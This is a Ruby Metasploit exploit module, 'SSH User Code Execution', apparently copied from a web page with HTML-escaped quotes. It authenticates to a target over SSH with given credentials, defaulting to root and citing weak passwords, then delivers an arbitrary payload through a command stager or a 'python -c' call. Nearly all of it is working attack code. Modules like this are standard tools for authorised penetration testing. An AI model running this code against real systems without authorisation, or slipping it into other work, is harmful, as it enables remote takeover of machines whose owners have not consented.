# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
require &#039;net/ssh&#039;
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ManualRanking
 
  include Msf::Exploit::CmdStager
  include Msf::Exploit::Remote::SSH
 
  attr_accessor :ssh_socket
 
  def initialize
    super(
      &#039;Name&#039;             => &#039;SSH User Code Execution&#039;,
      &#039;Description&#039;      => %q{
        This module connects to the target system and executes the necessary
        commands to run the specified payload via SSH. If a native payload is
        specified, an appropriate stager will be used.
      },
      &#039;Author&#039;           => [&#039;Spencer McIntyre&#039;, &#039;Brandon Knight&#039;],
      &#039;References&#039;       =>
        [
          [ &#039;CVE&#039;, &#039;1999-0502&#039;] # Weak password
        ],
      &#039;License&#039;          => MSF_LICENSE,
      &#039;Privileged&#039;       => true,
      &#039;DefaultOptions&#039;   =>
        {
          &#039;PrependFork&#039;  => &#039;true&#039;,
          &#039;EXITFUNC&#039;     => &#039;process&#039;
        },
      &#039;Payload&#039;          =>
        {
          &#039;Space&#039;        => 4096,
          &#039;BadChars&#039;     => "",
          &#039;DisableNops&#039;  => true
        },
      &#039;Platform&#039;         => %w{ linux osx python },
      &#039;Targets&#039;          =>
        [
          [ &#039;Linux x86&#039;,
            {
              &#039;Arch&#039;     => ARCH_X86,
              &#039;Platform&#039; => &#039;linux&#039;
            }
          ],
          [ &#039;Linux x64&#039;,
            {
              &#039;Arch&#039;     => ARCH_X64,
              &#039;Platform&#039; => &#039;linux&#039;
            }
          ],
          [ &#039;OSX x86&#039;,
            {
              &#039;Arch&#039;     => ARCH_X86,
              &#039;Platform&#039; => &#039;osx&#039;
            }
          ],
          [ &#039;Python&#039;,
            {
              &#039;Arch&#039;     => ARCH_PYTHON,
              &#039;Platform&#039; => &#039;python&#039;
            }
          ]
        ],
      &#039;CmdStagerFlavor&#039;  => %w{ bourne echo printf },
      &#039;DefaultTarget&#039;    => 0,
      # For the CVE
      &#039;DisclosureDate&#039;   => &#039;Jan 01 1999&#039;
    )
 
    register_options(
      [
        OptString.new(&#039;USERNAME&#039;, [ true, "The user to authenticate as.", &#039;root&#039; ]),
        OptString.new(&#039;PASSWORD&#039;, [ true, "The password to authenticate with.", &#039;&#039; ]),
        OptString.new(&#039;RHOST&#039;, [ true, "The target address" ]),
        Opt::RPORT(22)
      ], self.class
    )
 
    register_advanced_options(
      [
        OptBool.new(&#039;SSH_DEBUG&#039;, [ false, &#039;Enable SSH debugging output (Extreme verbosity!)&#039;, false])
      ]
    )
  end
 
  def execute_command(cmd, opts = {})
    vprint_status("Executing #{cmd}")
    begin
      Timeout.timeout(3) do
        self.ssh_socket.exec!("#{cmd}\n")
      end
    rescue ::Exception
    end
  end
 
  def do_login(ip, user, pass, port)
    factory = ssh_socket_factory
    opt_hash = {
      :auth_methods  => [&#039;password&#039;, &#039;keyboard-interactive&#039;],
      :port          => port,
      :use_agent     => false,
      :config        => false,
      :password      => pass,
      :proxy         => factory,
      :non_interactive => true
    }
 
    opt_hash.merge!(:verbose => :debug) if datastore[&#039;SSH_DEBUG&#039;]
 
    begin
      self.ssh_socket = Net::SSH.start(ip, user, opt_hash)
    rescue Rex::ConnectionError
      fail_with(Failure::Unreachable, &#039;Disconnected during negotiation&#039;)
    rescue Net::SSH::Disconnect, ::EOFError
      fail_with(Failure::Disconnected, &#039;Timed out during negotiation&#039;)
    rescue Net::SSH::AuthenticationFailed
      fail_with(Failure::NoAccess, &#039;Failed authentication&#039;)
    rescue Net::SSH::Exception => e
      fail_with(Failure::Unknown, "SSH Error: #{e.class} : #{e.message}")
    end
 
    if not self.ssh_socket
      fail_with(Failure::Unknown, &#039;Failed to start SSH socket&#039;)
    end
    return
  end
 
  def exploit
    do_login(datastore[&#039;RHOST&#039;], datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;], datastore[&#039;RPORT&#039;])
 
    print_status("#{datastore[&#039;RHOST&#039;]}:#{datastore[&#039;RPORT&#039;]} - Sending stager...")
    if target[&#039;Platform&#039;] == &#039;python&#039;
      execute_command("python -c \"#{payload.encoded}\"")
    else
      execute_cmdstager({:linemax => 500})
    end
 
    self.ssh_socket.close
  end
end

